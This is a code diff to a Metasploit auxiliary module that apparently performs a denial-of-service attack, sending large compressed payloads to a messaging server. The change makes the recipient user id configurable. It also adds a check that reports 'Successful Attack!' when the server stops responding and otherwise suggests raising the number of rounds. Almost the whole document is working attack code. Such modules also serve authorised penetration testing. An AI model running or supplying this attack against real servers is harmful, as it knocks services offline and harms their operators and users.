@@ -36,13 +36,14 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptInt.new('SIZE', [true, 'Size of uncompressed data in kilobytes (100kb default).', 100]),
         OptInt.new('ROUNDS', [true, 'Number of rounds to hit the server (1 default).', 1]),
+        OptInt.new('USERID', [true, 'App Scoped User Id of the recipient (0 default)', 0]),
       ],
     self.class)
   end
 
   def run
-  	@payload_scan = get_payload_for_message(1200872273321307, "")
-    @payload_dos = get_payload_for_message(1200872273321307, "payload", datastore['SIZE'])
+  	@payload_scan = get_payload_for_message(datastore['USERID'], "")
+    @payload_dos = get_payload_for_message(datastore['USERID'], "payload", datastore['SIZE'])
 
     scan_result = nil
 
@@ -94,6 +95,21 @@ class MetasploitModule < Msf::Auxiliary
           disconnect(c) if c
         end
       end
+
+      opts = {
+            'method' => 'POST',
+            'uri'   => normalize_uri(scan_result),
+            'data'  => @payload_scan,
+            'ctype' => "application/json"
+      }
+
+      print_status("Checking Server Status...")
+      res = send_request_cgi(opts)
+      if (res == nil)
+        print_status("Successful Attack! Server not reachable.")
+      else
+        print_status("Server still reachable - try with higher rounds setting")
+      end      
     end
   end
   def bytes_to_kb bytes
